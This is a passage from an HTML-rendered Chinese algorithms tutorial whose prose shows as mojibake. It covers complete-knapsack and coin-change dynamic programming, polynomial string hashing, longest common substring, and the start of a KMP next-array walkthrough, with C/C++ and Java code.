çš„èƒŒåŒ…ï¼Œè¦æ±‚é€‰æ‹©è‹¥å¹²ä¸ªç‰©å“æ”¾å…¥èƒŒåŒ…ä¸­ï¼Œä½¿å¾—ç‰©å“çš„æ€»ä½“ç§¯ä¸è¶…è¿‡ MMMï¼Œå¹¶ä¸”ç‰©å“çš„ä»·å€¼æ€»å’Œæœ€å¤§ã€‚</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; f(m + <span class="hljs-number">1</span>, <span class="hljs-number">-1000000000</span>); <span class="hljs-comment">// åˆå§‹åŒ–ï¼Œå®¹é‡ä¸º m çš„èƒŒåŒ…</span><br>f[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;      <span class="hljs-comment">// éå†æ¯ä¸€ç§ç‰©å“</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = v[i]; j &lt;= m; j++) &#123; <span class="hljs-comment">// j ä» v[i] åˆ° m é¡ºåºéå†</span><br>        f[j] = <span class="hljs-keyword">max</span>(f[j], f[j - v[i]] + w[i]); <span class="hljs-comment">// æ›´æ–°å½“å‰å®¹é‡ j çš„æœ€å¤§å€¼</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">int</span> ans = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt;= m; j++) &#123;<br>    ans = <span class="hljs-keyword">max</span>(ans, f[j]);<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="é›¶é’±å…‘æ¢-Ii"><a href="#é›¶é’±å…‘æ¢-Ii" class="headerlink" title="é›¶é’±å…‘æ¢ Ii"></a>é›¶é’±å…‘æ¢ Ii</h4><p>ç»™å®šä¸€ä¸ªæ•´æ•°æ•°ç»„ <code>coins</code> è¡¨ç¤ºä¸åŒé¢é¢çš„ç¡¬å¸ï¼›ä»¥åŠä¸€ä¸ªæ•´æ•° <code>amount</code>ï¼Œè¡¨ç¤ºæ€»é‡‘é¢ã€‚</p><p>ç¼–å†™ä¸€ä¸ªå‡½æ•°æ¥è®¡ç®—å¯ä»¥å‡‘æˆæ€»é‡‘é¢çš„ç¡¬å¸ç»„åˆæ•°ï¼Œå‡è®¾æ¯ç§ç¡¬å¸çš„æ•°é‡æ˜¯æ— é™çš„ã€‚</p><p><strong>ç¤ºä¾‹ 1ï¼š</strong></p><ul><li>è¾“å…¥ï¼š<code>amount = 5, coins = [1, 2, 5]</code></li><li>è¾“å‡ºï¼š<code>4</code></li></ul><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title">change</span><span class="hljs-params">(<span class="hljs-type">int</span> amount, <span class="hljs-type">int</span>[] coins)</span> </span>&#123;<br>    <span class="hljs-type">int</span>[] f = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[amount + <span class="hljs-number">1</span>];<br>    Arrays.<span class="hljs-built_in">fill</span>(f, <span class="hljs-number">0</span>);<br>    f[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; coins.length; i++) &#123; <span class="hljs-comment">// éå†æ¯ç§ç¡¬å¸</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = coins[i]; j &lt;= amount; j++) &#123; <span class="hljs-comment">// éå†ä» coins[i] åˆ° amount çš„é‡‘é¢</span><br>            f[j] += f[j - coins[i]]; <span class="hljs-comment">// æ›´æ–°æ–¹æ³•æ•°é‡</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> f[amount];<br>&#125;<br><br></code></pre></td></tr></table></figure><hr><h2 id="äºŒå-å­—ç¬¦ä¸²å¤„ç†"><a href="#äºŒå-å­—ç¬¦ä¸²å¤„ç†" class="headerlink" title="äºŒå.å­—ç¬¦ä¸²å¤„ç†"></a>äºŒå.å­—ç¬¦ä¸²å¤„ç†</h2><h3 id="å­—ç¬¦ä¸²å“ˆå¸Œ"><a href="#å­—ç¬¦ä¸²å“ˆå¸Œ" class="headerlink" title="å­—ç¬¦ä¸²å“ˆå¸Œ"></a>å­—ç¬¦ä¸²å“ˆå¸Œ</h3><p>åˆ¤æ–­å­ä¸²æ˜¯å¦ç›¸ç­‰</p><p>æ ¸å¿ƒæ€æƒ³ï¼šå°†å­—ç¬¦ä¸²çœ‹æˆPè¿›åˆ¶æ•°ï¼ŒPçš„ç»éªŒå€¼æ˜¯131æˆ–13331ï¼Œå–è¿™ä¸¤ä¸ªå€¼çš„å†²çªæ¦‚ç‡ä½<br>å°æŠ€å·§ï¼šå–æ¨¡çš„æ•°ç”¨2^64ï¼Œè¿™æ ·ç›´æ¥ç”¨unsigned long longå­˜å‚¨ï¼Œæº¢å‡ºçš„ç»“æœå°±æ˜¯å–æ¨¡çš„ç»“æœ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">str = &quot;abcd&quot;ï¼Œé‚£ä¹ˆæˆ‘ä»¬é€æ­¥è®¡ç®—å“ˆå¸Œå€¼å’Œå¹‚å€¼ã€‚</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">è®¡ç®—å¹‚å€¼æ•°ç»„ pï¼ˆå‡è®¾ P = 31ï¼‰ï¼š</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">p[0] = 1</span><br><span class="hljs-comment">p[1] = P^1 = 31</span><br><span class="hljs-comment">p[2] = P^2 = 31 * 31 = 961</span><br><span class="hljs-comment">p[3] = P^3 = 31 * 961 = 29791</span><br><span class="hljs-comment">p[4] = P^4 = 31 * 29791 = 923521</span><br><span class="hljs-comment">è®¡ç®—å“ˆå¸Œå€¼æ•°ç»„ hï¼š å‡è®¾ str = &quot;abcd&quot;ï¼Œæ¯ä¸ªå­—ç¬¦çš„ ASCII ç ä¸ºï¼š</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">a = 97</span><br><span class="hljs-comment">b = 98</span><br><span class="hljs-comment">c = 99</span><br><span class="hljs-comment">d = 100</span><br><span class="hljs-comment">æˆ‘ä»¬é€šè¿‡é€’æ¨è®¡ç®— h[i]ï¼š</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">h[1] = 97 ï¼ˆå­—ç¬¦ä¸² &quot;a&quot; çš„å“ˆå¸Œå€¼ï¼‰</span><br><span class="hljs-comment">h[2] = h[1] * P + 98 = 97 * 31 + 98 = 3025 ï¼ˆå­—ç¬¦ä¸² &quot;ab&quot; çš„å“ˆå¸Œå€¼ï¼‰</span><br><span class="hljs-comment">h[3] = h[2] * P + 99 = 3025 * 31 + 99 = 93974 ï¼ˆå­—ç¬¦ä¸² &quot;abc&quot; çš„å“ˆå¸Œå€¼ï¼‰</span><br><span class="hljs-comment">h[4] = h[3] * P + 100 = 93974 * 31 + 100 = 2911064 ï¼ˆå­—ç¬¦ä¸² &quot;abcd&quot; çš„å“ˆå¸Œå€¼ï¼‰</span><br><span class="hljs-comment">å“ˆå¸Œå€¼çš„è®¡ç®—æ–¹å¼æ˜¯é€’æ¨çš„ï¼šå‡è®¾æˆ‘ä»¬çŸ¥é“ str[1..i-1] çš„å“ˆå¸Œå€¼ h[i-1]ï¼Œé‚£ä¹ˆé€šè¿‡åŠ ä¸Šå­—ç¬¦ str[i]ï¼Œå¯ä»¥å¾—åˆ° str[1..i] çš„å“ˆå¸Œå€¼ï¼š</span><br><span class="hljs-comment">h[i] = h[i - 1] * P + str[i];</span><br><span class="hljs-comment">å½“ä½ éœ€è¦è®¡ç®—æŸä¸ªå­ä¸² str[l..r] çš„å“ˆå¸Œå€¼æ—¶ï¼Œå¯ä»¥é€šè¿‡ h[r] å’Œ h[l-1] çš„å·®å€¼æ¥è®¡ç®—ï¼š</span><br><span class="hljs-comment">ULL get(int l, int r) &#123;</span><br><span class="hljs-comment">    return h[r] - h[l - 1] * p[r - l + 1];</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">ç°åœ¨æˆ‘ä»¬æ¥è®¡ç®— str[2..3] ä¹Ÿå°±æ˜¯ &quot;bc&quot; çš„å“ˆå¸Œå€¼ã€‚</span><br><span class="hljs-comment">è®¡ç®—å­ä¸² str[2..3] çš„å“ˆå¸Œå€¼ï¼š</span><br><span class="hljs-comment">h[3] = 93974 ï¼ˆå­—ç¬¦ä¸² &quot;abc&quot; çš„å“ˆå¸Œå€¼ï¼‰</span><br><span class="hljs-comment">h[1] = 97 ï¼ˆå­—ç¬¦ä¸² &quot;a&quot; çš„å“ˆå¸Œå€¼ï¼‰</span><br><span class="hljs-comment">å­ä¸² &quot;bc&quot; çš„å“ˆå¸Œå€¼ get(2, 3) å°±æ˜¯ï¼š</span><br><span class="hljs-comment">get(2, 3) = h[3] - h[1] * p[3 - 2 + 1] = 93974 - 97 * p[2] = 93974 - 97 * 961</span><br><span class="hljs-comment">          = 93974 - 93377 = 597</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> ULL;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1000</span>;<br><span class="hljs-type">const</span> ULL P = <span class="hljs-number">31</span>;<br>ULL h[N], p[N]; <span class="hljs-comment">// h[k]å­˜å‚¨å­—ç¬¦ä¸²å‰kä¸ªå­—æ¯çš„å“ˆå¸Œå€¼, p[k]å­˜å‚¨ P^k mod 2^64</span><br><span class="hljs-comment">// åˆå§‹åŒ–stråˆ°æ•°ç»„ä¸­</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(<span class="hljs-built_in">string</span>&amp; str, <span class="hljs-type">int</span> n)</span> &#123;<br>    p[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        h[i] = h[i - <span class="hljs-number">1</span>] * P + str[i - <span class="hljs-number">1</span>]; <span class="hljs-comment">// è®¡ç®—å­—ç¬¦ä¸²å‰iä¸ªå­—ç¬¦çš„å“ˆå¸Œå€¼</span><br>        p[i] = p[i - <span class="hljs-number">1</span>] * P;              <span class="hljs-comment">// è®¡ç®—P^i</span><br>    &#125;<br>&#125;<br><span class="hljs-comment">// è®¡ç®—å­ä¸² str[l ~ r] çš„å“ˆå¸Œå€¼</span><br>ULL <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span>&#123;<br>    <span class="hljs-keyword">return</span> h[r] - h[l - <span class="hljs-number">1</span>] * p[r - l + <span class="hljs-number">1</span>];<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ä¾‹é¢˜-11"><a href="#ä¾‹é¢˜-11" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h4><h4 id="åˆ¤æ–­ä¸¤ä¸ªå­ä¸²æ˜¯å¦ç›¸ç­‰"><a href="#åˆ¤æ–­ä¸¤ä¸ªå­ä¸²æ˜¯å¦ç›¸ç­‰" class="headerlink" title="åˆ¤æ–­ä¸¤ä¸ªå­ä¸²æ˜¯å¦ç›¸ç­‰"></a>åˆ¤æ–­ä¸¤ä¸ªå­ä¸²æ˜¯å¦ç›¸ç­‰</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//ç»™å®šå­—ç¬¦ä¸² str = &quot;abcabc&quot;, åˆ¤æ–­ str[1..3] å’Œ str[4..6] æ˜¯å¦ç›¸ç­‰ã€‚</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> ULL;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1000</span>;<br><span class="hljs-type">const</span> ULL P = <span class="hljs-number">31</span>;<br>ULL h[N], p[N];  <span class="hljs-comment">// h[k]å­˜å‚¨å­—ç¬¦ä¸²å‰kä¸ªå­—æ¯çš„å“ˆå¸Œå€¼, p[k]å­˜å‚¨ P^k mod 2^64</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(<span class="hljs-built_in">string</span>&amp; str, <span class="hljs-type">int</span> n)</span> &#123;<br>    p[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        h[i] = h[i - <span class="hljs-number">1</span>] * P + str[i - <span class="hljs-number">1</span>]; <span class="hljs-comment">// è®¡ç®—å­—ç¬¦ä¸²å‰iä¸ªå­—ç¬¦çš„å“ˆå¸Œå€¼</span><br>        p[i] = p[i - <span class="hljs-number">1</span>] * P;              <span class="hljs-comment">// è®¡ç®—P^i</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// è®¡ç®—å­ä¸² str[l..r] çš„å“ˆå¸Œå€¼</span><br>ULL <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span> &#123;<br>    <span class="hljs-keyword">return</span> h[r] - h[l - <span class="hljs-number">1</span>] * p[r - l + <span class="hljs-number">1</span>];<br>&#125;<br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">areSubstringsEqual</span><span class="hljs-params">(<span class="hljs-type">int</span> l1, <span class="hljs-type">int</span> r1, <span class="hljs-type">int</span> l2, <span class="hljs-type">int</span> r2)</span> &#123;<br>    <span class="hljs-keyword">if</span> (r1 - l1 != r2 - l2) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// é•¿åº¦ä¸ä¸€æ ·å°±è‚¯å®šä¸ç›¸ç­‰</span><br>    <span class="hljs-keyword">return</span> get(l1, r1) == get(l2, r2);    <span class="hljs-comment">// æ¯”è¾ƒå“ˆå¸Œå€¼</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;abcabc&quot;</span>;<br>    <span class="hljs-type">int</span> n = str.length();<br>    <span class="hljs-comment">// åˆå§‹åŒ–å“ˆå¸Œæ•°ç»„</span><br>    init(str, n);<br>    <span class="hljs-comment">// åˆ¤æ–­ str[1..3] å’Œ str[4..6] æ˜¯å¦ç›¸ç­‰</span><br>    <span class="hljs-keyword">if</span> (areSubstringsEqual(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>)) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Substrings are equal!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Substrings are not equal!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="æœ€é•¿å…¬å…±å­ä¸²"><a href="#æœ€é•¿å…¬å…±å­ä¸²" class="headerlink" title="æœ€é•¿å…¬å…±å­ä¸²"></a>æœ€é•¿å…¬å…±å­ä¸²</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_set&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> ULL;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1000</span>;<br><span class="hljs-type">const</span> ULL P = <span class="hljs-number">31</span>;<br>ULL h1[N], h2[N], p1[N], p2[N];  <span class="hljs-comment">// h1, h2ä¸ºstr1å’Œstr2çš„å“ˆå¸Œå€¼ï¼Œp1, p2ä¸ºå¹‚å€¼</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(<span class="hljs-built_in">string</span>&amp; str, <span class="hljs-type">int</span> n, ULL h[], ULL p[])</span> &#123;<br>    p[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        h[i] = h[i - <span class="hljs-number">1</span>] * P + str[i - <span class="hljs-number">1</span>];<br>        p[i] = p[i - <span class="hljs-number">1</span>] * P;<br>    &#125;<br>&#125;<br><br>ULL <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r, ULL h[], ULL p[])</span> &#123;<br>    <span class="hljs-keyword">return</span> h[r] - h[l - <span class="hljs-number">1</span>] * p[r - l + <span class="hljs-number">1</span>];<br>&#125;<br><span class="hljs-type">bool</span> <span class="hljs-title function_">check</span><span class="hljs-params">(<span class="hljs-type">int</span> len, <span class="hljs-built_in">string</span>&amp; str1, <span class="hljs-built_in">string</span>&amp; str2)</span> &#123;<br>    <span class="hljs-built_in">unordered_set</span>&lt;ULL&gt; hashes;<br>    <span class="hljs-type">int</span> n = str1.length(), m = str2.length();<br>    <span class="hljs-comment">// è®¡ç®—str1æ‰€æœ‰é•¿åº¦ä¸ºlençš„å­ä¸²çš„å“ˆå¸Œå€¼</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i + len - <span class="hljs-number">1</span> &lt;= n; i++) &#123;<br>        hashes.insert(get(i, i + len - <span class="hljs-number">1</span>, h1, p1));<br>    &#125;<br>    <span class="hljs-comment">// æŸ¥æ‰¾str2ä¸­æ˜¯å¦æœ‰é•¿åº¦ä¸ºlençš„å­ä¸²çš„å“ˆå¸Œå€¼ä¸str1ç›¸åŒ</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i + len - <span class="hljs-number">1</span> &lt;= m; i++) &#123;<br>        <span class="hljs-keyword">if</span> (hashes.count(get(i, i + len - <span class="hljs-number">1</span>, h2, p2))) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">string</span> str1 = <span class="hljs-string">&quot;abcdef&quot;</span>;<br>    <span class="hljs-built_in">string</span> str2 = <span class="hljs-string">&quot;zcdemn&quot;</span>;<br>    <span class="hljs-type">int</span> n = str1.length(), m = str2.length();<br>    <span class="hljs-comment">// åˆå§‹åŒ–å“ˆå¸Œæ•°ç»„</span><br>    init(str1, n, h1, p1);<br>    init(str2, m, h2, p2);<br>    <span class="hljs-type">int</span> l = <span class="hljs-number">0</span>, r = min(n, m);<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// äºŒåˆ†æ³•æŸ¥æ‰¾æœ€é•¿å…¬å…±å­ä¸²çš„é•¿åº¦</span><br>    <span class="hljs-keyword">while</span> (l &lt;= r) &#123;<br>        <span class="hljs-type">int</span> mid = (l + r) / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (check(mid, str1, str2)) &#123;<br>            ans = mid;<br>            l = mid + <span class="hljs-number">1</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            r = mid - <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>   <br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Length of longest common substring: &quot;</span> &lt;&lt; ans &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="kmp"><a href="#kmp" class="headerlink" title="kmp"></a>kmp</h3><p>ne æ•°ç»„çš„å®šä¹‰</p><p><code>ne[i]</code> è¡¨ç¤ºå­—ç¬¦ä¸² <code>s[1..i]</code>ï¼ˆå³ä»ç¬¬ 1 ä¸ªå­—ç¬¦åˆ°ç¬¬ i ä¸ªå­—ç¬¦ï¼‰ä¸­ï¼Œæœ€é•¿çš„ç›¸ç­‰çš„å‰ç¼€å’Œåç¼€çš„é•¿åº¦ï¼ˆå‰åç¼€çš„ç›¸ç­‰éƒ¨åˆ†ä¸åŒ…æ‹¬ <code>s[i]</code> æœ¬èº«ï¼‰ã€‚</p><p>neæ•°ç»„çš„è®¡ç®—è¿‡ç¨‹</p><p>å¯¹äºæ¯ä¸ªä½ç½® <code>i</code>ï¼Œæˆ‘ä»¬éœ€è¦æŸ¥æ‰¾ <code>s[1..i]</code> çš„æœ€é•¿å‰åç¼€ã€‚å…·ä½“è®¡ç®—æ–¹æ³•å¦‚ä¸‹ï¼š</p><ol><li>å¦‚æœå½“å‰å­—ç¬¦ <code>s[i]</code> ä¸ä¹‹å‰çš„æŸä¸ªéƒ¨åˆ†ä¸åŒ¹é…ï¼Œæˆ‘ä»¬éœ€è¦æŸ¥çœ‹ <code>ne</code> æ•°ç»„çš„å€¼æ¥å†³å®šè·³è¿‡å¤šå°‘ä¸ªå­—ç¬¦ï¼Œä»¥å…è¿›è¡Œé‡å¤æ¯”è¾ƒã€‚</li><li>å¦‚æœå½“å‰å­—ç¬¦ <code>s[i]</code> ä¸ä¹‹å‰çš„æŸä¸ªéƒ¨åˆ†åŒ¹é…ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ‰©å±•å‰åç¼€ã€‚</li></ol><p>å­—ç¬¦ä¸²ï¼š<code>ababcab</code></p><ol><li>åˆå§‹åŒ–ï¼š<ul><li><code>s = &quot;ababcab&quot;</code>ï¼Œé•¿åº¦ä¸º 7ã€‚</li><li><code>ne[0] = 0</code>ï¼Œå› ä¸ºæ²¡æœ‰å­—ç¬¦ã€‚</li></ul></li><li>è®¡ç®— <code>ne</code> æ•°ç»„ï¼š<ul><li><code>i = 1</code>ï¼Œå­—ç¬¦ <code>s[1] = &#39;a&#39;</code>ï¼š<ul><li>è¿™é‡Œæ²¡æœ‰å‰ç¼€å’Œåç¼€ï¼Œæ‰€ä»¥ <code>ne[1] = 0</code>ã€‚</li></ul></li><li><code>i = 2</code>ï¼Œå­—ç¬¦ <code>s[2] = &#39;b&#39;</code>ï¼š<ul><li><code>s[1] = &#39;a&#39;</code> å’Œ <code>s[2] = &#39;b&#39;</code> ä¸åŒ¹é…ï¼Œæ‰€ä»¥ <code>ne[2] = 0</code>ã€‚</li></ul></li><li><code>i = 3</code>ï¼Œå­—ç¬¦ <code>s[3] = &#39;a&#39;</code>ï¼š<ul><li><code>s[1] = &#39;a&#39;</code> å’Œ <code>s[3] = &#39;a&#39;</code> åŒ¹é…ï¼Œæ‰€ä»¥ <code>ne[3] = 1</code>ï¼Œè¡¨ç¤ºå‰ç¼€å’Œåç¼€ <code>a</code> åŒ¹é…ã€‚</li></ul></li><li><code>i = 4</code>ï¼Œå­—ç¬¦ <code>s[4] = &#39;b&#39;</code>ï¼š<ul><li><code>s[2] = &#39;b&#39;</code> å’Œ <code>s[4] = &#39;b&#39;</code> åŒ¹é…ï¼Œæ‰€ä»¥ <code>ne[4] = 2</code>ï¼Œè¡¨ç¤ºå‰ç¼€å’Œåç¼€ <code>ab</code> åŒ¹é…ã€‚</li></ul></li><li><code>i = 5</code>ï¼Œå­—ç¬¦ <code>s[5] = &#39;c&#39;</code>ï¼š<ul><li><code>s[3] = &#39;a&#39;</code> å’Œ <code>s[5] = &#39;c&#39;</code> ä¸åŒ¹é…ï¼Œå›é€€åˆ° <code>ne[3] = 1</code>ï¼Œ<code>s[1] = &#39;a&#39;</code> å’Œ <code>s[5] = &#39;c&#39;</code> ä¹Ÿä¸åŒ¹é…ï¼Œå›é€€åˆ° <code>ne[1] = 0</code>ï¼Œ<code>s[1] = &#39;a&#39;</code> å’Œ <code>s[5] = &#39;c&#39;</code> ä¸åŒ¹é…ï¼Œæœ€ç»ˆ <code>ne[5] = 0</code>ã€‚</li></ul></li><li><code>i = 6</code>ï¼Œå­—ç¬¦ <code>s[6] = &#39;a&#39;</code>ï¼š<ul><li><code>s[1] = &#39;a&#39;</code> å’Œ <code>s[6] = &#39;a&#39;</code> åŒ¹é…ï¼Œæ‰€ä»¥ <code>ne[6] = 